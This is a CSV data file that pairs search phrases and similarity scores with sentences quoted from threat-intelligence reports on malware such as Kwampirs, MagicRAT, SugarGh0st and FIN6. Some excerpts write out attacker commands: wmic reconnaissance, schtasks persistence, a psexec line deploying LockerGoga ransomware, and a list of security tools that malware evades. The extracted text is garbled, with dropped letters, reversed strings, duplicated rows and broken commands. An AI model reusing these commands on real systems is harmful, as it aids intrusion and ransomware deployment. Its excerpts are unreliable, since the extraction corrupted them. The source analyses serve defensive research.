hash,phrase,similarity,adjacent_sentences
949b57ffdfcc42e1765f65e65995733b,wmic,0.8873197545818806,"['This module executes a series of comands to gather aditional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the comands are not identical to the analogous module examined in the initial Symantec report.', 'These comands executed by this module are almost al wmic comands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snipet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypas configuration arays with an iterator (v2).', 'Shamon 1, 2 and 3 and Kwampirs, al contain arays for C2, and Proxy, ProxyByPas, and acesType information.', 'INDEX cylera.com 24 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAdres, EndingAdres wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snipet 9: Kwampirs comands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it sems likely that the use of this module is intended for a reconaisance phase.', 'The types of information gathered may imply that the physical atributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be infered from this information.', 'INDEX cylera.com 25 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon 5.1.5 Artifact Similarities File Metadata The metadata of the droper and reporter components (DL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamon (Figures 30, 31, 32 and 3), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Droper Shamon Droper Figure 30: Kwampirs droper metadata Figure 31: Shamon droper metadata INDEX cylera.com 26 ANALYSIS SECTIONS The linkage betwen Kwampirs and Shamon Kwampirs Reporter Shamon Reporter Figure 32: Kwampirs reporter metadata Figure 3: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples loks diferent and contains many diferent tols.']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
31347d89b18461f35448b26fefb00133,cmd.exe /c start,0.7861735725500969,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /c start,0.7861735725500969,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
08a0ccc49008dbbf532b22d39ac2b886,delete the driver files.,0.7719300643534468,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
3e9312913ace03550c810e6b92ab1d61,whoami /groups,0.8671286062716087,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami /groups,0.8671286062716087,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
d62a6e941ec0167b0f3e15c72eb634ba,the configuration file encrypted.,0.8266329492308891,"['It writes itself in files: and modifies the %system32%\\wbem\\wmiqry32.dl, %system32%\\wbem\\wmihlp32.dl system registry to be loaded instead of file.', '%system32%\\wbem\\wbemsvc.dl To achieve this, it writes the folowing registry value: [HKCR\\CLSID\\{7C857801-7381-1CF-84D-0A04B2E24}\\InProcServer32] Default = %system32%\\wbem\\wmihlp32.dl Operation The module is automaticaly loaded into proceses that use wbemsvc.dl.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShelHWStop, Global\\ShelHWDetectionEvent events, mutex ShelHWDetectionMutex.', '12 The main thread exits if the folowing proceses were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwal.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lokout.exe savprogres.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHok.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Snifer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe spfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewalsvc.exe supdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgacount.exe CavAUD.exe ipatrol.exe webwal.exe privatefirewal3.exe CavEmSrv.exe pciprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rt_crc_service.exe Cavl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavAp.exe privatefirewal3.exe avas.exe sdtrayap.exe CavCons.exe pft.exe avcom.exe siteadv.exe CavMud.exe armorwal.exe avkproxy.exe sndsrvc.exe CavUMAS.exe ap_firewal.exe avkservice.exe snsmcon.exe Upd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4s.exe avtask.exe avkwctl.exe CavQ.exe tpfdmn.exe aws.exe firewal.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rser.exe bgnt.exe spybotsd.exe OnAcesInstaler.exe op_mon.exe botsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bulguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewal.exe Packetyzer.exe washer.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13 zerospywarelite_instaler.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewal.exe ashdisp.exe rawshark.exe vdtask.exe firewal204.exe ashmaisv.exe Ethereal.exe asr.exe firewalgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of aditional modules, their names, DL exports names to cal and location of the modules aditional files.', 'Gaus ShelNotifyUser ShelNotifyUserEx SetWindowEvent InitShelEx %systemrot%\\system32\\winshel.ocx %temp%\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\dskapi.ocx %temp%\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\smdk.ocx %temp%\\~mdk.tmp String values from config file (example) 14 Every module is loaded and its export functions are caled as specified in the configuration.', 'Most of the actions are loged in an encrypted (with XOR) file %temp%\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading aditional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction lop.', 'Prior to comunicating with the C&C, al the information from the other modules log files is copied to the ~shw.tmp file.']"
39e29af445d8deae622f11c7366518a7,The batch script,0.8423512966646981,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
eca348ac2e9d0da5334464f9c73d2754,The batch script,0.8423512966646981,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 5/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
d3d11f0faf194266cc86ec9f1af4162d,with batch scripts,0.7586541997864189,"['In 2019 we saw several cases in which threat actors that historicaly targeted sensitive information such as personaly identifiable information (PI) and credit card information turned to ransomware to monetize aces to victim networks.', 'FIN6 In one case, FIN6, a cyber crime group known to target payment card information, was identified operating inside a company in the enginering sector.', 'The presence of FIN6 in an enginering company with no conection to payment card information semed od.', 'The Mandiant investigation revealed that the atacker was in the early stages of a deploying LockerGoga.', 'Using domain administrator credentials, the atacker ran batch files containing psexec comands to conect to remote systems and deploy LockerGoga.', 'The batch scripts (Fig.', '1) executed LockerGoga as the service mstdc, which was likely the atackers atempt to masquerade as the legitimate Windows service msdtc.', 'The batch files used by Figure 1. the atacker folowed the naming convention xa.bat, xab.bat, xac.bat and Strings from so on.', 'deployment BAT files.', 'start copy svchost.exe \\10.1.1.1\\c$\\windows\\temp\\start psexec.exe \\10.1.1.1 -u domain\\domainadmin -p pasword -d -h -r mstdc -s -acepteula -nobaner c:\\windows\\temp\\svchost.exe Mandiant analysts linked the tols and atacker infrastructure to other FIN6 activity, and eventualy concluded that FIN6 had expanded to using ransomware to further monetize their aces to compromised environments.', 'UNC173 In 2019, UNC173 targeted a retailer and tried to obtain payment card information from the point-of-sale (POS) environment.']"
